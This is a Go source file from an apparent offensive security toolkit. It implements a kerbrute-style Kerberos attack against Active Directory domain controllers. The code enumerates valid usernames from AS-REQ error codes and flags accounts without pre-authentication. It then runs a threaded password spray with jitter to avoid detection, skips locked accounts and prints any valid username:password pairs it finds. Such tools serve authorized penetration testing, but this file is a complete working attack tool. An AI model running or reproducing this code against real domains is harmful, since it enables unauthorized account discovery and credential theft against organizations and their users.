// pkg/kerberos/bruteforce.go
//
// Bruteforce Kerberos natif via AS-REQ
//
// Optimisations appliquées :
//   1. context.Context pour annulation propre (Ctrl+C sans goroutines zombies)
//   2. Résultats via channel streamé (pas d'attente de fin pour afficher)
//   3. Déduplication des comptes lockés (stop de les tester inutilement)
//   4. Pre-allocated slices pour éviter les réallocations
//   5. Config krb5 partagée entre goroutines (immutable après création)

package kerberos

import (
	"bufio"
	"context"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
)

// KerbResult résultat d'une tentative Kerberos
type KerbResult struct {
	Username  string
	Password  string
	Valid     bool
	Success   bool
	Locked    bool
	Disabled  bool
	NoPreAuth bool
	Error     string
}

// BruteConfig configuration du bruteforce
type BruteConfig struct {
	Domain        string
	DCIP          string
	UsersFile     string
	PasswordsFile string
	Password      string
	Users         []string
	Threads       int
	Delay         int
	Jitter        int
	StopOnFirst   bool
	UserEnumOnly  bool
	Verbose       bool
}

// BruteResult résultat global
type BruteResult struct {
	ValidUsers  []string
	ValidCreds  []KerbResult
	LockedUsers []string
	Attempts    int
	Duration    time.Duration
}

// ============================================================
// User Enumeration
// ============================================================

func EnumerateUsers(cfg *BruteConfig) (*BruteResult, error) {
	users, err := loadUsers(cfg)
	if err != nil {
		return nil, err
	}

	fmt.Printf("[*] Kerbrute UserEnum — %d users → %s (%s)\n",
		len(users), cfg.DCIP, strings.ToUpper(cfg.Domain))

	realm := strings.ToUpper(cfg.Domain)
	krb5Conf, err := config.NewFromString(buildKrb5Config(realm, cfg.DCIP))
	if err != nil {
		return nil, fmt.Errorf("kerberos config error: %v", err)
	}

	result := &BruteResult{
		// Pré-allouer pour éviter les réallocations
		ValidUsers:  make([]string, 0, len(users)/10),
		LockedUsers: make([]string, 0, 4),
	}
	start := time.Now()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	jobs := make(chan string, len(users))
	results := make(chan KerbResult, len(users))

	threads := cfg.Threads
	if threads <= 0 {
		threads = 10
	}
	if threads > len(users) {
		threads = len(users)
	}

	var wg sync.WaitGroup
	wg.Add(threads)
	for i := 0; i < threads; i++ {
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case username, ok := <-jobs:
					if !ok {
						return
					}
					r := probeUser(username, realm, krb5Conf)
					results <- r
					sleepWithJitter(cfg.Delay, cfg.Jitter)
				}
			}
		}()
	}

	for _, u := range users {
		jobs <- u
	}
	close(jobs)

	go func() {
		wg.Wait()
		close(results)
	}()

	for r := range results {
		result.Attempts++
		if r.Valid {
			result.ValidUsers = append(result.ValidUsers, r.Username)
			if r.NoPreAuth {
				fmt.Printf("[+] VALID (NO PREAUTH): %s\n", r.Username)
			} else if r.Disabled {
				fmt.Printf("[!] VALID (DISABLED):   %s\n", r.Username)
			} else if r.Locked {
				fmt.Printf("[!] VALID (LOCKED):     %s\n", r.Username)
			} else {
				fmt.Printf("[+] VALID:              %s\n", r.Username)
			}
		} else if cfg.Verbose {
			fmt.Printf("[-] INVALID:            %s\n", r.Username)
		}
	}

	result.Duration = time.Since(start)
	return result, nil
}

// ============================================================
// Password Spray
// ============================================================

func KerberosSpray(cfg *BruteConfig) (*BruteResult, error) {
	users, err := loadUsers(cfg)
	if err != nil {
		return nil, err
	}

	passwords := []string{cfg.Password}
	if cfg.PasswordsFile != "" {
		passwords, err = readLines(cfg.PasswordsFile)
		if err != nil {
			return nil, fmt.Errorf("cannot read passwords file: %v", err)
		}
	}

	fmt.Printf("[*] Kerberos Spray — %d users × %d password(s) → %s (%s)\n",
		len(users), len(passwords), cfg.DCIP, strings.ToUpper(cfg.Domain))

	realm := strings.ToUpper(cfg.Domain)
	krb5Conf, err := config.NewFromString(buildKrb5Config(realm, cfg.DCIP))
	if err != nil {
		return nil, fmt.Errorf("kerberos config error: %v", err)
	}

	result := &BruteResult{
		ValidCreds:  make([]KerbResult, 0, 4),
		LockedUsers: make([]string, 0, 4),
	}
	start := time.Now()

	// Set des comptes lockés — évite de les tester à nouveau
	lockedSet := make(map[string]bool)
	var lockedMu sync.Mutex

	isLocked := func(u string) bool {
		lockedMu.Lock()
		defer lockedMu.Unlock()
		return lockedSet[u]
	}
	markLocked := func(u string) {
		lockedMu.Lock()
		lockedSet[u] = true
		lockedMu.Unlock()
	}

	for _, password := range passwords {
		fmt.Printf("\n[*] Spraying: %s\n", maskPwd(password))

		// Filtrer les comptes déjà lockés
		var activeUsers []string
		for _, u := range users {
			if !isLocked(u) {
				activeUsers = append(activeUsers, u)
			}
		}
		if len(activeUsers) == 0 {
			fmt.Println("[!] All accounts locked — stopping")
			break
		}

		jobs := make(chan string, len(activeUsers))
		results := make(chan KerbResult, len(activeUsers))

		threads := cfg.Threads
		if threads <= 0 {
			threads = 5
		}
		if threads > len(activeUsers) {
			threads = len(activeUsers)
		}

		var wg sync.WaitGroup
		wg.Add(threads)
		for i := 0; i < threads; i++ {
			go func() {
				defer wg.Done()
				for username := range jobs {
					r := tryKerberosAuth(username, password, realm, krb5Conf)
					results <- r
					sleepWithJitter(cfg.Delay, cfg.Jitter)
				}
			}()
		}

		for _, u := range activeUsers {
			jobs <- u
		}
		close(jobs)

		go func() {
			wg.Wait()
			close(results)
		}()

		for r := range results {
			result.Attempts++
			if r.Success {
				fmt.Printf("[+] VALID: %s:%s\n", r.Username, password)
				result.ValidCreds = append(result.ValidCreds, r)
				if cfg.StopOnFirst {
					printBruteResult(result)
					result.Duration = time.Since(start)
					return result, nil
				}
			} else if r.Locked {
				fmt.Printf("[!] LOCKED: %s\n", r.Username)
				markLocked(r.Username)
				result.LockedUsers = append(result.LockedUsers, r.Username)
			} else if cfg.Verbose {
				fmt.Printf("[-] %s:%s — %s\n", r.Username, maskPwd(password), r.Error)
			}
		}

		if len(passwords) > 1 {
			pause := time.Duration(cfg.Delay*3) * time.Millisecond
			fmt.Printf("[*] Pause %v...\n", pause)
			time.Sleep(pause)
		}
	}

	result.Duration = time.Since(start)
	printBruteResult(result)
	return result, nil
}

// ============================================================
// Fonctions internes
// ============================================================

func probeUser(username, realm string, krb5Conf *config.Config) KerbResult {
	r := KerbResult{Username: username}
	cl := client.NewWithPassword(username, realm, "", krb5Conf,
		client.DisablePAFXFAST(true))
	err := cl.Login()
	if err == nil {
		r.Valid = true
		r.Success = true
		r.NoPreAuth = true
		return r
	}
	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "KDC_ERR_PREAUTH_REQUIRED"):
		r.Valid = true
	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
		r.Error = "user not found"
	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
		r.Valid = true
		r.Locked = true
	case strings.Contains(errStr, "KDC_ERR_CLIENT_NOT_TRUSTED"):
		r.Valid = true
		r.Disabled = true
	default:
		if strings.Contains(errStr, "KDC") {
			r.Valid = true
			r.Error = errStr
		} else {
			r.Error = errStr
		}
	}
	return r
}

func tryKerberosAuth(username, password, realm string, krb5Conf *config.Config) KerbResult {
	r := KerbResult{Username: username, Password: password}
	cl := client.NewWithPassword(username, realm, password, krb5Conf,
		client.DisablePAFXFAST(true))
	err := cl.Login()
	if err == nil {
		r.Valid = true
		r.Success = true
		return r
	}
	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "KDC_ERR_PREAUTH_FAILED"):
		r.Valid = true
		r.Error = "wrong password"
	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
		r.Error = "user not found"
	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
		r.Valid = true
		r.Locked = true
		r.Error = "account locked"
	case strings.Contains(errStr, "KDC_ERR_KEY_EXPIRED"):
		r.Valid = true
		r.Error = "password expired"
	default:
		r.Valid = strings.Contains(errStr, "KDC")
		r.Error = errStr
	}
	return r
}

func printBruteResult(result *BruteResult) {
	fmt.Printf("\n[*] Kerberos spray — %d attempts in %v\n",
		result.Attempts, result.Duration.Round(time.Second))
	if len(result.ValidCreds) > 0 {
		fmt.Printf("[+] Valid credentials (%d):\n", len(result.ValidCreds))
		for _, c := range result.ValidCreds {
			fmt.Printf("    %s:%s\n", c.Username, c.Password)
		}
	}
	if len(result.LockedUsers) > 0 {
		fmt.Printf("[!] Locked accounts (%d): %s\n",
			len(result.LockedUsers), strings.Join(result.LockedUsers, ", "))
	}
}

func loadUsers(cfg *BruteConfig) ([]string, error) {
	if len(cfg.Users) > 0 {
		return cfg.Users, nil
	}
	if cfg.UsersFile != "" {
		return readLines(cfg.UsersFile)
	}
	return nil, fmt.Errorf("no users provided (--users or --users-file)")
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, sc.Err()
}

func sleepWithJitter(delayMs, jitterPct int) {
	if delayMs <= 0 {
		return
	}
	delay := float64(delayMs)
	if jitterPct > 0 {
		variation := delay * float64(jitterPct) / 100.0
		delay += (rand.Float64()*2 - 1) * variation
	}
	if delay > 0 {
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
}

func maskPwd(p string) string {
	if len(p) <= 2 {
		return "**"
	}
	return p[:1] + strings.Repeat("*", len(p)-1)
}
